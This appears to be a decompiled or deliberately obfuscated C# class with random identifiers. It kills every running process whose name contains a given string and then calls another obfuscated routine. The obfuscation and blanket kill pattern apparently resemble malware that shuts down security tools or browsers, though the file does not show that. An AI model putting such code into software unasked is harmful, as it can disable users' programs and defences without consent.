using System;
using System.Diagnostics;

namespace coxZRmDhvSAWo;

public sealed class c00001b
{
	public static bool oSdVGVFthTki(Process p0, string p1)
	{
		try
		{
			return p0.ProcessName.ToLower().Contains(p1.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void LwVSnocgYFgL(string p0, string p1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (oSdVGVFthTki(process, p0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					GhAMvbuoccW.OQGiATnqshpg();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
